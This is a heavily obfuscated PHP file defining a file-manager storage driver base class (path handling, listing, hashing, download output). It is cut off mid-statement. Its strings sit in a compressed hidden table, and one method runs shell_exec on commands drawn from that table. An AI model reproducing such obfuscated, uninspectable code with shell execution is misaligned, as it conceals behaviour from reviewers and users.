<?php
 goto DˆÈó·Ê‡§; e‰àÃ¼’É˜: define($_SERVER[ïÃ°£«Ê][0], $_SERVER[ïÃ°£«Ê][1]); $_SERVER[øÃÑ²Œ] = explode($_SERVER[ïÃ°£«Ê][2], gzinflate(substr($_SERVER[ïÃ°£«Ê][3], 10, -8))); function binCheckEq($² ç¨ä, $½î–Ö’“) { return $² ç¨ä == $½î–Ö’“; } goto AÖø¡å®–Ë; aƒÃÄ˜†ñê: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ƒ–ıÏŒ =& $_SERVER[ïÃ°£«Ê]; $this->objectDriver = array($ƒ–ıÏŒ[60], $ƒ–ıÏŒ[61], $ƒ–ıÏŒ[62], $ƒ–ıÏŒ[63], $ƒ–ıÏŒ[64], $ƒ–ıÏŒ[65], $ƒ–ıÏŒ[66], $ƒ–ıÏŒ[67], $ƒ–ıÏŒ[68], $ƒ–ıÏŒ[69], $ƒ–ıÏŒ[70], $ƒ–ıÏŒ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($©âµî¬) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($©âµî¬, $_SERVER[ïÃ°£«Ê][8]); } return $©âµî¬; } public function iconvApp($¢±ßÑõ¸) { return $¢±ßÑõ¸; } public function iconvSystem($¡¡ıÑß¨) { return $¡¡ıÑß¨; } public function iconvTo($¾Õí„úÅ, $½ôØÜ••, $éõÑ—Ÿ) { $Æà¿á£í =& $_SERVER[ïÃ°£«Ê]; if (!$¾Õí„úÅ || !function_exists($Æà¿á£í[72])) { return $¾Õí„úÅ; } static $şÒ‡ìÇ = array(); $ÇÊ›Äğ¹ = $½ôØÜ•• . $Æà¿á£í[73] . $éõÑ—Ÿ . $Æà¿á£í[74] . $¾Õí„úÅ; if (isset($şÒ‡ìÇ[$ÇÊ›Äğ¹])) { return $şÒ‡ìÇ[$ÇÊ›Äğ¹]; } if (function_exists($Æà¿á£í[75])) { $°àè¼¸  = @mb_convert_encoding($¾Õí„úÅ, $éõÑ—Ÿ, $½ôØÜ••); } else { $°àè¼¸  = @iconv($½ôØÜ••, $éõÑ—Ÿ, $¾Õí„úÅ); } $°àè¼¸  = $°àè¼¸  ? $°àè¼¸  : $¾Õí„úÅ; if (strstr($°àè¼¸ , $Æà¿á£í[76])) { $°àè¼¸  = str_replace($Æà¿á£í[76], $Æà¿á£í[11], $°àè¼¸ ); } $şÒ‡ìÇ[$½ôØÜ•• . $Æà¿á£í[73] . $éõÑ—Ÿ . $Æà¿á£í[74] . $¾Õí„úÅ] = $°àè¼¸ ; $şÒ‡ìÇ[$éõÑ—Ÿ . $Æà¿á£í[73] . $½ôØÜ•• . $Æà¿á£í[74] . $¾Õí„úÅ] = $¾Õí„úÅ; $şÒ‡ìÇ[$éõÑ—Ÿ . $Æà¿á£í[73] . $½ôØÜ•• . $Æà¿á£í[74] . $°àè¼¸ ] = $¾Õí„úÅ; $şÒ‡ìÇ[$½ôØÜ•• . $Æà¿á£í[73] . $éõÑ—Ÿ . $Æà¿á£í[74] . $°àè¼¸ ] = $°àè¼¸ ; return $°àè¼¸ ; } public function getPathInner($Ğó•Û®ª) { $Ùà§‰ÖÄ = IO::init($Ğó•Û®ª); return $Ùà§‰ÖÄ->path; } public function getPathOuter($§Š»Õ¬È) { $¬›àĞ¡‘ =& $_SERVER[ïÃ°£«Ê]; $êªİ×ñ¿ = strlen(trim($this->pathBase, $¬›àĞ¡‘[8])); $§Š»Õ¬È = substr(trim($§Š»Õ¬È, $¬›àĞ¡‘[8]), $êªİ×ñ¿); return $this->pathDriver . $¬›àĞ¡‘[8] . ltrim($§Š»Õ¬È, $¬›àĞ¡‘[8]); } public function isParentOf($ÇÕ˜°Ëá, $Ù… „Ğ²) { $‹¥ûŒåÊ =& $_SERVER[ïÃ°£«Ê]; $ÇÕ˜°Ëá = rtrim(strtolower($ÇÕ˜°Ëá), $‹¥ûŒåÊ[8]) . $‹¥ûŒåÊ[8]; $Ù… „Ğ² = rtrim(strtolower($Ù… „Ğ²), $‹¥ûŒåÊ[8]) . $‹¥ûŒåÊ[8]; $Ëüğ‚Ø = strpos($Ù… „Ğ², $ÇÕ˜°Ëá) === 0; return $Ëüğ‚Ø; } public function getType() { $Íæ£Å¼ =& $_SERVER[ïÃ°£«Ê]; $ëà‡ŒÉ = str_replace($Íæ£Å¼[77], $Íæ£Å¼[12], get_class($this)); return strtolower($ëà‡ŒÉ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($­ï­»¹ú, $ÆÛÊš) { $Æá“èş =& $_SERVER[ïÃ°£«Ê]; $´…§ÛÚ = rtrim($­ï­»¹ú, $Æá“èş[8]) . $Æá“èş[8] . $ÆÛÊš; $Ñî˜…£— = $this->exist($´…§ÛÚ); return $Ñî˜…£— ? $´…§ÛÚ : !1; } public function setModifyTime($ÊÕòòŞ“, $ÈÖ½Ëï = '') { } public function renameObject($òÆŸŸÓ», $æ›Œ„šÒ) { $¥Š¹½¶ = $æ›Œ„šÒ; $òÆŸŸÓ» = $this->getPathOuter($òÆŸŸÓ»); $æ›Œ„šÒ = $this->pathFather($òÆŸŸÓ») . $æ›Œ„šÒ; $«½Ä¹Ëµ = IO::copy($òÆŸŸÓ», $this->pathFather($òÆŸŸÓ»), REPEAT_RENAME_FOLDER, $¥Š¹½¶); if ($«½Ä¹Ëµ) { IO::remove($òÆŸŸÓ»); } return $«½Ä¹Ëµ ? $æ›Œ„šÒ : !1; } public function tempFile($€ı¢Æ¾ = '', $óü¾ã° = '') { if (!$€ı¢Æ¾) { $€ı¢Æ¾ = rand_string(15); } $úĞ°É¯ = TEMP_FILES . rand_string(15) . $_SERVER[ïÃ°£«Ê][8]; @mkdir($úĞ°É¯, DEFAULT_PERRMISSIONS, !0); $êÏÔµ = $úĞ°É¯ . $€ı¢Æ¾; @touch($êÏÔµ); if ($óü¾ã°) { file_put_contents($êÏÔµ, $óü¾ã°); } return $êÏÔµ; } public function tempFileRemve($‰ˆÍàáÃ) { @unlink($‰ˆÍàáÃ); @rmdir($this->pathFather($‰ˆÍàáÃ)); } public function mkfile($ééÇÚçõ, $‹»äëåì = '', $ƒçÅ‚¢² = REPEAT_RENAME) { } public function mkdir($ÙÓóÖ¥°, $¾»Á±’ = REPEAT_SKIP) { } public function delFile($õÓ§˜ä) { } public function delFolder($áÜ…ˆƒ) { } public function copyFile($±Ñ¾¤ ‚, $Ò­ÌÇ¼í) { } public function moveFile($¤ÌäÄ¼½, $Ñ’Ê¨û») { } public function remove($ªøÉôÊ) { if ($this->isFile($ªøÉôÊ)) { return $this->delFile($ªøÉôÊ); } return $this->delFolder($ªøÉôÊ); } public function rename($àÀÕ•©±, $–Ôß›Ç) { } public function exist($•»³Â÷¢) { } public function isFile($‹ïøÎÕñ) { } public function isFolder($é°ìè¶’) { } public function size($€ôÇŞÄî) { } public function info($äè¢Úº) { } public function infoSimple($£Æà¡Ä¦) { return $this->info($£Æà¡Ä¦); } public function infoAuth($¹úÛÉ×½) { return $this->info($¹úÛÉ×½); } public function infoFull($ ¹„ø€) { return $this->info($ ¹„ø€); } public function infoFullSimple($´ ÅÙëÍ) { return $this->info($´ ÅÙëÍ); } public function infoWithChildren($Î”–ı”Ğ) { $¦•œàÓÖ =& $_SERVER[ïÃ°£«Ê]; static $—ˆ’†½€ = array(); if (isset($—ˆ’†½€[$Î”–ı”Ğ])) { return $—ˆ’†½€[$Î”–ı”Ğ]; } $š²ÎÅıŸ = $this->info($Î”–ı”Ğ); if ($š²ÎÅıŸ && $š²ÎÅıŸ[$¦•œàÓÖ[33]] == $¦•œàÓÖ[78]) { $Çæ‹­ñ = array($¦•œàÓÖ[79] => 0, $¦•œàÓÖ[80] => 0, $¦•œàÓÖ[81] => 0); $this->infoChildren($Î”–ı”Ğ, $Çæ‹­ñ); $š²ÎÅıŸ[$¦•œàÓÖ[79]] = $Çæ‹­ñ[$¦•œàÓÖ[79]]; $š²ÎÅıŸ[$¦•œàÓÖ[82]] = array($¦•œàÓÖ[83] => $Çæ‹­ñ[$¦•œàÓÖ[80]], $¦•œàÓÖ[84] => $Çæ‹­ñ[$¦•œàÓÖ[81]]); $—ˆ’†½€[$Î”–ı”Ğ] = $š²ÎÅıŸ; } return $š²ÎÅıŸ; } public function listPath($³èÀÆÒ, $Æ‚¶¶Íµ = false) { } public function has($¡€²¶ší, $Èù‡ïÇ = false, $¢ûéì’ = false) { } public function canRead($Üå¾èª) { } public function canWrite($”Ò”©¾—) { } public function getContent($ •ˆãû¡) { } public function setContent($Î†“¨ø, $…Õ×ûÖ• = '') { } protected function infoChildren($“«Ù°—µ, &$¡ÂÈ”Ë) { $à ‹©‹€ =& $_SERVER[ïÃ°£«Ê]; check_abort_echo(); $ğ’Ò´£– = $this->listPath($“«Ù°—µ, !0); $ğ’Ò´£– = array_merge($ğ’Ò´£–[$à ‹©‹€[85]], $ğ’Ò´£–[$à ‹©‹€[86]]); foreach ($ğ’Ò´£– as $Ûıüçš—) { if ($Ûıüçš—[$à ‹©‹€[33]] == $à ‹©‹€[78]) { $¡ÂÈ”Ë[$à ‹©‹€[81]]++; $Êà„¬äÁ = $this->getPathInner($Ûıüçš—[$à ‹©‹€[87]]); $this->infoChildren($Êà„¬äÁ, $¡ÂÈ”Ë); } else { $¡ÂÈ”Ë[$à ‹©‹€[80]]++; $¡ÂÈ”Ë[$à ‹©‹€[79]] += $Ûıüçš—[$à ‹©‹€[79]]; } } } public function fileSubstr($—™ıÈáª, $à§Õş, $ıƒ¼¯Ì•) { } public function listAll($œŸ¸¾‰÷) { } public function listAllMake($œå‡ûì, &$Â‡Å‰¦é) { $Çë½Ä¿µ =& $_SERVER[ïÃ°£«Ê]; check_abort_echo(); $§Ã¾Ğ„È = $this->listPath($œå‡ûì, !0); if (!$§Ã¾Ğ„È) { return; } $Ú±ÏÙŞ‹ = array_merge($§Ã¾Ğ„È[$Çë½Ä¿µ[85]], $§Ã¾Ğ„È[$Çë½Ä¿µ[86]]); foreach ($Ú±ÏÙŞ‹ as $ıíññÕ) { $É¿”àî = $ıíññÕ[$Çë½Ä¿µ[33]] == $Çë½Ä¿µ[78]; $ï——£¼ï = array($Çë½Ä¿µ[87] => $ıíññÕ[$Çë½Ä¿µ[87]], $Çë½Ä¿µ[78] => $É¿”àî); if (isset($ıíññÕ[$Çë½Ä¿µ[79]])) { $ï——£¼ï[$Çë½Ä¿µ[79]] = $ıíññÕ[$Çë½Ä¿µ[79]]; } if (isset($ıíññÕ[$Çë½Ä¿µ[88]])) { $ï——£¼ï[$Çë½Ä¿µ[88]] = $ıíññÕ[$Çë½Ä¿µ[88]]; } if (!$É¿”àî) { $Â‡Å‰¦é[] = $ï——£¼ï; continue; } $Â‡Å‰¦é[] = $ï——£¼ï; $ÓùÒ©¥ = $ıíññÕ[$Çë½Ä¿µ[87]]; $Äùœ¤“ = $this->pathDriver; if (substr($ıíññÕ[$Çë½Ä¿µ[87]], 0, strlen($Äùœ¤“)) == $Äùœ¤“) { $ÓùÒ©¥ = substr($ÓùÒ©¥, strlen($Äùœ¤“)); } $this->listAllMake($ÓùÒ©¥, $Â‡Å‰¦é); } } public function listAllSimple($Ö­³Í†, $¡²ÚÈ×Õ = false) { $„ØÖŠÀˆ = $this->listAll($Ö­³Í†); return $this->listAllSimpleMake($„ØÖŠÀˆ, $this->getPathOuter($Ö­³Í†), $¡²ÚÈ×Õ); } public function listAllSimpleMake($ô¬Œ°½¼, $ûŞ€ÅÖ, $í¢Ô¾é) { $²Íœ¡¾Õ =& $_SERVER[ïÃ°£«Ê]; $Ø¨Š½§æ = array(); $ûŞ€ÅÖ = rtrim(get_path_father($ûŞ€ÅÖ), $²Íœ¡¾Õ[8]) . $²Íœ¡¾Õ[8]; foreach ($ô¬Œ°½¼ as $±¢–éáŸ) { $ö™Ö‘ö— = array($²Íœ¡¾Õ[87] => $±¢–éáŸ[$²Íœ¡¾Õ[87]], $²Íœ¡¾Õ[89] => $±¢–éáŸ[$²Íœ¡¾Õ[87]], $²Íœ¡¾Õ[78] => $±¢–éáŸ[$²Íœ¡¾Õ[78]]); if (isset($±¢–éáŸ[$²Íœ¡¾Õ[79]]) && !$±¢–éáŸ[$²Íœ¡¾Õ[78]]) { $ö™Ö‘ö—[$²Íœ¡¾Õ[79]] = $±¢–éáŸ[$²Íœ¡¾Õ[79]]; } if (isset($±¢–éáŸ[$²Íœ¡¾Õ[88]])) { $ö™Ö‘ö—[$²Íœ¡¾Õ[88]] = $±¢–éáŸ[$²Íœ¡¾Õ[88]]; } if (is_array($±¢–éáŸ[$²Íœ¡¾Õ[90]])) { $ö™Ö‘ö—[$²Íœ¡¾Õ[89]] = $±¢–éáŸ[$²Íœ¡¾Õ[90]][$²Íœ¡¾Õ[87]]; $ö™Ö‘ö—[$²Íœ¡¾Õ[79]] = $±¢–éáŸ[$²Íœ¡¾Õ[90]][$²Íœ¡¾Õ[79]]; $ö™Ö‘ö—[$²Íœ¡¾Õ[88]] = $±¢–éáŸ[$²Íœ¡¾Õ[90]][$²Íœ¡¾Õ[88]]; } else { if (substr($±¢–éáŸ[$²Íœ¡¾Õ[87]], 0, strlen($ûŞ€ÅÖ)) == $ûŞ€ÅÖ) { $ö™Ö‘ö—[$²Íœ¡¾Õ[87]] = substr($±¢–éáŸ[$²Íœ¡¾Õ[87]], strlen($ûŞ€ÅÖ)); } } $ªÒƒù÷” = $±¢–éáŸ[$²Íœ¡¾Õ[78]] ? $²Íœ¡¾Õ[8] : $²Íœ¡¾Õ[12]; $ö™Ö‘ö—[$²Íœ¡¾Õ[89]] = rtrim($ö™Ö‘ö—[$²Íœ¡¾Õ[89]], $²Íœ¡¾Õ[8]) . $ªÒƒù÷”; $ö™Ö‘ö—[$²Íœ¡¾Õ[87]] = $²Íœ¡¾Õ[8] . trim($ö™Ö‘ö—[$²Íœ¡¾Õ[87]], $²Íœ¡¾Õ[8]) . $ªÒƒù÷”; if (!$í¢Ô¾é) { $ªÉ¬£êˆ = explode($²Íœ¡¾Õ[8], trim($ö™Ö‘ö—[$²Íœ¡¾Õ[87]], $²Íœ¡¾Õ[8])); $ö™Ö‘ö—[$²Íœ¡¾Õ[87]] = $²Íœ¡¾Õ[8] . implode($²Íœ¡¾Õ[8], array_slice($ªÉ¬£êˆ, 1)) . $ªÒƒù÷”; } $Ø¨Š½§æ[] = $ö™Ö‘ö—; } return array_sort_by($Ø¨Š½§æ, $²Íœ¡¾Õ[87]); } public function upload($éš›ı, $ªı»Ù¹’, $èó‘Ğ‚ù = false, $ì¾Æ‰¥« = REPEAT_REPLACE) { } public function uploadFileByID($ƒÌû¼Àï, $ğ¥ëÌàË, $·­èÓ€Ñ) { } public function uploadFileByPath($¶¡”¥®é, $°Ç¦‘º­, $“¹¾¸¨å = array()) { } public function isUploadServer() { $Ïì¤”å® =& $_SERVER[ïÃ°£«Ê]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ïì¤”å®[91]) { return !0; } return $GLOBALS[$Ïì¤”å®[6]][$Ïì¤”å®[92]][$Ïì¤”å®[93]]; } public function isFileOutServer() { $Ì•äü”· =& $_SERVER[ïÃ°£«Ê]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ì•äü”·[91]) { return !0; } return $GLOBALS[$Ì•äü”·[6]][$Ì•äü”·[92]][$Ì•äü”·[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¯†ìÁ•¤) { $É¼Šë =& $_SERVER[ïÃ°£«Ê]; if (!$this->isCdnHost()) { return $¯†ìÁ•¤; } return str_replace(trim(get_url_root($¯†ìÁ•¤), $É¼Šë[8]), trim($this->cdnHost, $É¼Šë[8]), $¯†ìÁ•¤); } public function uploadLink($èË‚ÑÃ•, $Ïï·¨îç = 0) { $ÛŞÒÙÅí =& $_SERVER[ïÃ°£«Ê]; if ($this->isUploadServer()) { return; } $Ïà”²ê = $this->getType(); if (!in_array($Ïà”²ê, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $”æßÚìŸ = 1024 * 1024 * 10; $şŠªÈÁ… = (!$Ïï·¨îç ? 1 : ceil($Ïï·¨îç / pow(1024, 3))) * 3600 * 4; if ($Ïï·¨îç <= $”æßÚìŸ) { $Ùã—„àè = $this->uploadFormData($èË‚ÑÃ•, $şŠªÈÁ…); } else { $Ùã—„àè = $this->uploadMultiData($èË‚ÑÃ•, $şŠªÈÁ…); } if ($Ùã—„àè) { $Ùã—„àè[$ÛŞÒÙÅí[95]] = $èË‚ÑÃ•; $Ùã—„àè[$ÛŞÒÙÅí[96]] = $Ïà”²ê; } return $Ùã—„àè; } public function uploadFormData($ºÜ›ï‹Ö, $¦™æ = 3600) { } public function uploadMultiData($ÌÅ¬äõÊ, $ê×öä€ = 3600) { } public function multiUploadFormData($ŒÃ…öÁù, $ªøàÃÕß = 3600) { return $this->uploadMultiData($ŒÃ…öÁù, $ªøàÃÕß); } public function download($í¦æ·ç”, $Ù¾’’–½) { } public function ext($Óçæ¸€÷) { return get_path_ext($Óçæ¸€÷); } public function pathThis($’‚È…ö) { $Ôüúæ€ =& $_SERVER[ïÃ°£«Ê]; $’‚È…ö = str_replace($Ôüúæ€[97], $Ôüúæ€[8], rtrim($’‚È…ö, $Ôüúæ€[8])); $À¯òØñÜ = strrpos($’‚È…ö, $Ôüúæ€[8]); if ($À¯òØñÜ === !1) { return $’‚È…ö; } return substr($’‚È…ö, $À¯òØñÜ + 1); } public function pathFather($ŠÄ†Œ‹Á) { $Š¹ÁÀªë =& $_SERVER[ïÃ°£«Ê]; $ŠÄ†Œ‹Á = str_replace($Š¹ÁÀªë[97], $Š¹ÁÀªë[8], rtrim($ŠÄ†Œ‹Á, $Š¹ÁÀªë[8])); $¾ˆë¾ÒŠ = strrpos($ŠÄ†Œ‹Á, $Š¹ÁÀªë[8]); if ($¾ˆë¾ÒŠ === !1) { return $Š¹ÁÀªë[12]; } return substr($ŠÄ†Œ‹Á, 0, $¾ˆë¾ÒŠ + 1); } public function hashSimple($±Íğ¹¿³) { $¿’¼“Øš =& $_SERVER[ïÃ°£«Ê]; if (!$±Íğ¹¿³) { return md5($¿’¼“Øš[12]); } $íı¦ë¦“ = $this->size($±Íğ¹¿³); $ÌñÁÃµ = 200; $ä©ÅÖ±ù = 50; if ($íı¦ë¦“ <= $ÌñÁÃµ * $ä©ÅÖ±ù) { return $this->hashMd5($±Íğ¹¿³) . $íı¦ë¦“; } $¥£™©½Å = intval($íı¦ë¦“ / $ä©ÅÖ±ù); $úİ¨°® = $¿’¼“Øš[12]; for ($–êáóı— = 0; $–êáóı— < $ä©ÅÖ±ù; $–êáóı—++) { $úİ¨°® .= $this->fileSubstr($±Íğ¹¿³, $¥£™©½Å * $–êáóı—, $ÌñÁÃµ); } $úİ¨°® .= $this->fileSubstr($±Íğ¹¿³, $íı¦ë¦“ - $ÌñÁÃµ, $ÌñÁÃµ); return md5($úİ¨°®) . $íı¦ë¦“; } public static $md5Cache = array(); public function hashMd5($ìíòÎÂº) { if (!$ìíòÎÂº) { return md5($_SERVER[ïÃ°£«Ê][12]); } $ìíòÎÂº = $this->iconvSystem($ìíòÎÂº); if (isset(self::$md5Cache[$ìíòÎÂº])) { return self::$md5Cache[$ìíòÎÂº]; } self::$md5Cache[$ìíòÎÂº] = $this->hashMd5Shell($ìíòÎÂº); if (!self::$md5Cache[$ìíòÎÂº]) { self::$md5Cache[$ìíòÎÂº] = @md5_file($ìíòÎÂº); } return self::$md5Cache[$ìíòÎÂº]; } private function hashMd5Shell($çÔè©Ó) { $ı™¦ÔÌ÷ =& $_SERVER[ïÃ°£«Ê]; if (!$çÔè©Ó) { return md5($ı™¦ÔÌ÷[12]); } if (!function_exists($ı™¦ÔÌ÷[98])) { return !1; } $êîÀÓëœ = array($ı™¦ÔÌ÷[99], $ı™¦ÔÌ÷[100]); $œÀØî•æ = Cache::get($ı™¦ÔÌ÷[101]); if (!$œÀØî•æ) { $µ”üš¸ = BASIC_PATH . $ı™¦ÔÌ÷[102]; $–¯¤·‹ = md5_file($µ”üš¸); $œÀØî•æ = $ı™¦ÔÌ÷[103]; foreach ($êîÀÓëœ as $­¯äéåË) { $†Òó™Œ” = shell_exec($­¯äéåË . $ı™¦ÔÌ÷[53] . escapeShell($µ”üš¸)); if ($†Òó™Œ” && substr(trim($†Òó™Œ”), 0, 32) == $–¯¤·‹) { $œÀØî•æ = $­¯äéåË; break; } } Cache::set($ı™¦ÔÌ÷[101], $œÀØî•æ, 3600); } if ($œÀØî•æ == $ı™¦ÔÌ÷[103]) { return !1; } $†Òó™Œ” = shell_exec($œÀØî•æ . $ı™¦ÔÌ÷[53] . escapeShell($çÔè©Ó)); $†Òó™Œ” = str_replace($ı™¦ÔÌ÷[104], $ı™¦ÔÌ÷[12], $†Òó™Œ”); return substr($†Òó™Œ”, 0, 32); } public function link($Í¤ßËàÅ) { return $Í¤ßËàÅ; } public function fileOut($±ÏÍ§ûä, $Ê‘­ˆÙ = false, $ä”ÏåË½ = false, $—õë•ºù = '') { $®şÉÌ®ì =& $_SERVER[ïÃ°£«Ê]; $this->cacheMethod(null, null); if (!$±ÏÍ§ûä || !$this->exist($±ÏÍ§ûä)) { show_json(LNG($®şÉÌ®ì[105]), !1, $ä”ÏåË½); } $å¼°×†À = $this->getType() == $®şÉÌ®ì[106]; $ø¿“•Æ— = $GLOBALS[$®şÉÌ®ì[6]][$®şÉÌ®ì[92]][$®şÉÌ®ì[107]][$®şÉÌ®ì[108]]; $ß³‚ÃúÎ = (double) $GLOBALS[$®şÉÌ®ì[6]][$®şÉÌ®ì[92]][$®şÉÌ®ì[107]][$®şÉÌ®ì[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¯’ùˆ¥‹ = $this->infoFull($±ÏÍ§ûä); $…êİâÃğ = $¯’ùˆ¥‹[$®şÉÌ®ì[79]]; $Ğ˜ùÕçï = gmdate($®şÉÌ®ì[110], $¯’ùˆ¥‹[$®şÉÌ®ì[88]]); $Ø½ı¼„° = $ä”ÏåË½ ? $ä”ÏåË½ : $this->iconvApp($¯’ùˆ¥‹[$®şÉÌ®ì[32]]); $ìóõ¼ = 0; $ØúÇ¥ğ = $…êİâÃğ - 1; $®á±¢³ = $this->ext($Ø½ı¼„°); if (in_array($®á±¢³, array($®şÉÌ®ì[111], $®şÉÌ®ì[112], $®şÉÌ®ì[113], $®şÉÌ®ì[114]))) { $®á±¢³ = $®şÉÌ®ì[115]; } if (in_array($®á±¢³, array($®şÉÌ®ì[116]))) { $®á±¢³ = $®şÉÌ®ì[117]; } if (!$—õë•ºù) { $—õë•ºù = md5($Ğ˜ùÕçï . $…êİâÃğ); } $—õë•ºù = $®şÉÌ®ì[118] . $—õë•ºù . $®şÉÌ®ì[118]; $À²…ĞíÜ = get_file_mime($®á±¢³); $·©À³¬û = !0; $·©À³¬û = isset($_GET[$®şÉÌ®ì[119]]) ? !1 : !0; if ($Ê‘­ˆÙ === !1 && !mime_support($À²…ĞíÜ)) { $À²…ĞíÜ = $®şÉÌ®ì[120]; } header($®şÉÌ®ì[121]); header($®şÉÌ®ì[122] . $À²…ĞíÜ); $™š«Á®† = rawurlencode($Ø½ı¼„°); $™š«Á®† = $®şÉÌ®ì[118] . $™š«Á®† . $®şÉÌ®ì[123] . $™š«Á®†; if ($Ê‘­ˆÙ) { header($®şÉÌ®ì[124]); header($®şÉÌ®ì[125] . $™š«Á®†); } else { if ($·©À³¬û) { header($®şÉÌ®ì[126] . $™š«Á®†); } } $‡òôã­ = 3600 * 24 * 30; header($®şÉÌ®ì[127]); header($®şÉÌ®ì[128]); header($®şÉÌ®ì[129] . $‡òôã­); header($®şÉÌ®ì[130] . gmdate($®şÉÌ®ì[110], time() + $‡òôã­) . $®şÉÌ®ì[131]); if (isset($_SERVER[$®şÉÌ®ì[132]]) && strtotime($_SERVER[$®şÉÌ®ì[132]]) == $¯’ùˆ¥‹[$®şÉÌ®ì[88]]) { header($®şÉÌ®ì[133], !0, 304); die; } if (isset($_SERVER[$®şÉÌ®ì[134]]) && $_SERVER[$®şÉÌ®ì[134]] == $—õë•ºù) { header($®şÉÌ®ì[135] . $—õë•ºù, !0, 304); die; } header($®şÉÌ®ì[135] . $—õë•ºù); header($®şÉÌ®ì[136] . $Ğ˜ùÕçï . $®şÉÌ®ì[131]); header($®şÉÌ®ì[137] . rawurlencode($Ø½ı¼„°)); header($®şÉÌ®ì[138]); header($®şÉÌ®ì[139] . $…êİâÃğ); header($®şÉÌ®ì[140]); Hook::trigger($®şÉÌ®ì[141], $±ÏÍ§ûä, $…êİâÃğ, $Ø½ı¼„°, $®á±¢³); if (!$Ê‘­ˆÙ && $®á±¢³ == $®şÉÌ®ì[142]) { if ($…êİâÃğ > 1024 * 1024 * 10) { die; } $ÜÇõ§ì„ = $this->getContent($±ÏÍ§ûä); $ÜÇõ§ì„ = Html::clearSVG($ÜÇõ§ì„); header($®şÉÌ®ì[143] . strlen($ÜÇõ§ì„)); echo $ÜÇõ§ì„; die; } $Â”å°í = strtolower($_SERVER[$®şÉÌ®ì[144]]); if ($å¼°×†À && $Â”å°í && $ø¿“•Æ—) { if (strstr($Â”å°í, $®şÉÌ®ì[145])) { header($®şÉÌ®ì[146] . $±ÏÍ§ûä); } else { if (strstr($Â”å°í, $®şÉÌ®ì[147])) { header($®şÉÌ®ì[148] . $±ÏÍ§ûä); } else { if (strstr($Â”å°í, $®şÉÌ®ì[149])) { header($®şÉÌ®ì[150] . $±ÏÍ§ûä); } } } if ($ß³‚ÃúÎ) { header($®şÉÌ®ì[151] . $ß³‚ÃúÎ); } return; } if (isset($_SERVER[$®şÉÌ®ì[152]])) { if (preg_match($®şÉÌ®ì[153], $_SERVER[$®şÉÌ®ì[152]], $‡Ñ¡Úªï)) { $ìóõ¼ = intval($‡Ñ¡Úªï[1]); $ìóõ¼ = $ìóõ¼ <= 0 ? 0 : ($ìóõ¼ >= $ØúÇ¥ğ ? $ØúÇ¥ğ : $ìóõ¼); if (!empty($‡Ñ¡Úªï[2])) { $˜»£öŒÙ = intval($‡Ñ¡Úªï[2]); $ØúÇ¥ğ = $˜»£öŒÙ < $ìóõ¼ ? $ìóõ¼ : ($˜»£öŒÙ >= $ØúÇ¥ğ ? $ØúÇ¥ğ : $˜»£öŒÙ); } } header($®şÉÌ®ì[154]); header("\103\157\x6e\164\145\156\164\x2d\122\x61\x6e\x67\x65\72\x20\142\x79\164\x65\x73\40{$ìóõ¼}\x2d{$ØúÇ¥ğ}\57" . $…êİâÃğ); } else { header($®şÉÌ®ì[155]); } header($®şÉÌ®ì[156]); header($®şÉÌ®ì[157]); $ê¨ ãË¯ = !0; if ($_SERVER[$®şÉÌ®ì[158]] == $®şÉÌ®ì[159] && $…êİâÃğ > 1204 * 1024 * 1024 * 2) { $ê¨ ãË¯ = !1; } if ($ê¨ ãË¯) { header($®şÉÌ®ì[160] . ($ØúÇ¥ğ - $ìóõ¼ + 1)); } if ($_SERVER[$®şÉÌ®ì[161]] == $®şÉÌ®ì[162]) { return; } $–¹Àü— = array($®şÉÌ®ì[163] => !1, $®şÉÌ®ì[164] => $ìóõ¼, $®şÉÌ®ì[165] => $ØúÇ¥ğ, $®şÉÌ®ì[166] => $®á±¢³, $®şÉÌ®ì[167] => $¯’ùˆ¥‹, $®şÉÌ®ì[168] => $®şÉÌ®ì[12], $®şÉÌ®ì[169] => 0); $–¹Àü— = Hook::filter($®şÉÌ®ì[170], $–¹Àü—); $ëÙôŠê° = 1024 * 300; $ªşÑƒÒí = 0; if ($ß³‚ÃúÎ) { $ªşÑƒÒí = intval(1000 * 1000 * ($ëÙôŠê° / $ß³‚ÃúÎ)); } while ($ìóõ¼ <= $ØúÇ¥ğ) { $ÚÌÕ’Ç¡ = timeFloat(); check_abort(); $ôãÖ³ì¢ = $ØúÇ¥ğ - $ìóõ¼ + 1; if ($ôãÖ³ì¢ <= $ëÙôŠê°) { $ëÙôŠê° = $ôãÖ³ì¢; } $ÜÇõ§ì„ = $this->fileSubstr($±ÏÍ§ûä, $ìóõ¼, $ëÙôŠê°); if ($–¹Àü—[$®şÉÌ®ì[163]]) { $–¹Àü—[$®şÉÌ®ì[168]] = $ÜÇõ§ì„; $–¹Àü—[$®şÉÌ®ì[169]] = $ìóõ¼; $–¹Àü— = Hook::filter($®şÉÌ®ì[171], $–¹Àü—); $ÜÇõ§ì„ = $–¹Àü—[$®şÉÌ®ì[168]]; } echo $ÜÇõ§ì„; $ìóõ¼ += $ëÙôŠê°; if ($ëÙôŠê° == $ôãÖ³ì¢) { $ìóõ¼ = $ØúÇ¥ğ + 1; } if ($ªşÑƒÒí) { $Üôı¹Ô– = intval(1000 * 1000 * (timeFloat() - $ÚÌÕ’Ç¡)); $Ø÷ ¶íØ = $ªşÑƒÒí - $Üôı¹Ô–; if ($Ø÷ ¶íØ > 5) { usleep($Ø÷ ¶íØ); } } } } public function fileOutServer($—ÅÇ·Ó½, $ú® ÉÏÚ = false, $ª‡ºµñ = false, $ºªÂ¸Á” = '') { $this->fileOut($—ÅÇ·Ó½, $ú® ÉÏÚ, $ª‡ºµñ, $ºªÂ¸Á”); } public function fileOutLink($üŞ­¾ç) { header($_SERVER[ïÃ°£«Ê][172] . $üŞ­¾ç); die; } public function cacheMethod($¯¯¼Ãää, $ø§ÔÜ², $íŒŒâ´© = null) { $îš¹È¸ =& $_SERVER[ïÃ°£«Ê]; static $şğşœã = array(); $‹Ôô®Î = $ø§ÔÜ² ? 